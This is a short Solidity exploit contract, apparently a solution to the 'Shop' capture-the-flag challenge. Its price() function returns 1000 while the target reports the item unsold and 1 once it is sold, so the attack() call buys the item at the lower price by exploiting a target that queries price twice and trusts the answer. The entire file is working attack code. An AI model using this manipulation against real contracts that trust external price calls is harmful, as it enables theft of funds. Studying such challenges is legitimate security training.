// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract poc{
    Shop target;
    constructor(address addr){
        target=Shop(addr);
    }
    function price() external view returns (uint256){
        uint256 a=1000;
        uint256 b=1;
        int i=0;
        if (target.isSold()==false){
            return a;
        }else {
            return b;
        }
        
    }

    function attack() public{
        target.buy();

    }
}
